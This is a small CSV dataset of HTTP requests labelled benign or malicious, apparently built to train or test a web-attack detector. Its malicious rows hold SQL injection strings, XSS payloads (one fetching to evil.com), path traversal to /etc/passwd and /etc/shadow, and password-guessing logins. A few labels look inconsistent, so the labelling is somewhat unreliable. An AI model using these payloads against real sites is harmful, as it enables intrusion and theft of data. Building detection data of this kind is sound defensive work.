src_ip,dst_ip,path,method,payload,label
10.0.0.1,192.168.1.10,/login,POST,username=user&password=pass,0
10.0.0.2,192.168.1.10,/home,GET,,0
10.0.0.3,192.168.1.10,/products?id=12,GET,,0
123.45.67.89,192.168.1.10,/login,POST,username=admin&password=' OR 1=1 --,1
203.0.113.8,192.168.1.10,/wp-admin,GET,,1
203.0.113.9,192.168.1.10,/admin/dashboard,GET,,1
198.51.100.23,192.168.1.10,/api/search?q=test,GET,,0
198.51.100.50,192.168.1.10,/upload,POST,file=data&content=<script>alert(1)</script>,1
45.76.12.1,192.168.1.10,/profile,POST,bio="just updating profile",0
44.22.19.4,192.168.1.10,/login,POST,username=admin&password=password123,0
102.54.21.8,192.168.1.10,/admin,GET,,1
66.77.88.99,192.168.1.10,/search?q=normal+search,GET,,0
88.190.12.44,192.168.1.10,/phpmyadmin,GET,,1
8.8.8.8,192.168.1.10,/index.php,GET,,0
8.8.4.4,192.168.1.10,/login,POST,username=test&password=test,0
51.89.23.43,192.168.1.10,/admin,POST,username=admin&password=admin,1
203.0.113.12,192.168.1.10,/login,POST,username=admin&password='; DROP TABLE users; --,1
104.26.12.32,192.168.1.10,/uploads,POST,file=@/etc/passwd,1
34.120.0.15,192.168.1.10,/search,GET,<img src=x onerror=alert('XSS')>,1
203.0.113.77,192.168.1.10,../../etc/passwd,GET,,1
185.199.108.1,192.168.1.10,/admin/config.php,GET,,1
192.30.253.113,192.168.1.10,/api/data?id=1,GET,,0
192.30.253.114,192.168.1.10,/api/data?id=' OR '1'='1,GET,,1
172.217.4.46,192.168.1.10,/login,POST,"username=test&password=<script>alert('x')</script>",1
10.0.0.4,192.168.1.10,/cart,GET,,0
10.0.0.5,192.168.1.10,/checkout,POST,order_id=12345&status=confirm,0
10.0.0.6,192.168.1.10,/profile/settings,GET,,0
10.0.0.7,192.168.1.10,/search?q=shoes,GET,,0
10.0.0.8,192.168.1.10,/api/orders?id=5,GET,,0
203.0.113.90,192.168.1.10,/admin/login,POST,username=admin&password=123456,1
203.0.113.91,192.168.1.10,/admin/login,POST,username=admin&password=admin123,1
203.0.113.92,192.168.1.10,/admin/login,POST,username=admin&password=qwerty,1
203.0.113.93,192.168.1.10,/admin/login,POST,username=admin&password=letmein,1
203.0.113.94,192.168.1.10,/admin/login,POST,username=admin&password=welcome,1
198.51.100.60,192.168.1.10,/login,POST,username=root&password=' OR 1=1 --,1
198.51.100.61,192.168.1.10,/login,POST,username=admin&password=' OR '1'='1,1
198.51.100.62,192.168.1.10,/login,POST,username=test&password=' UNION SELECT credit_card FROM users --,1
198.51.100.63,192.168.1.10,/search,GET,query=' UNION SELECT password FROM users --,1
198.51.100.64,192.168.1.10,/products,GET,id=1 UNION SELECT * FROM users --,1
203.0.113.100,192.168.1.10,/wp-login.php,POST,log=admin&pwd=admin,1
203.0.113.101,192.168.1.10,/wp-admin/admin.php,GET,,1
203.0.113.102,192.168.1.10,/xmlrpc.php,POST,<methodCall><methodName>wp.getUsersBlogs</methodName></methodCall>,1
203.0.113.103,192.168.1.10,/phpinfo.php,GET,,1
203.0.113.104,192.168.1.10,/admin/index.php,GET,,1
45.33.32.156,192.168.1.10,/search,GET,<script>fetch('http://evil.com/cookie')</script>,1
45.33.32.157,192.168.1.10,/comments,POST,comment=<img src=x onerror=alert('xss')>,1
45.33.32.158,192.168.1.10,/download?file=../../etc/shadow,GET,,1
45.33.32.159,192.168.1.10,/backup.sql,GET,,1
45.33.32.160,192.168.1.10,/debug,GET,,0
100.64.1.10,192.168.1.10,/home,GET,,0
100.64.1.11,192.168.1.10,/blog/post?id=10,GET,,0
100.64.1.12,192.168.1.10,/contact,POST,name=alice&message=hello,0
100.64.1.13,192.168.1.10,/about,GET,,0
100.64.1.14,192.168.1.10,/faq,GET,,0
192.0.2.10,192.168.1.10,/admin,GET,,1
192.0.2.11,192.168.1.10,/admin/secret,GET,,1
192.0.2.12,192.168.1.10,/admin,POST,username=admin&password=' OR 1=1 --,1
192.0.2.13,192.168.1.10,/admin/delete_user,POST,user_id=1&confirm=yes,1
192.0.2.14,192.168.1.10,/admin/logs,GET,,1
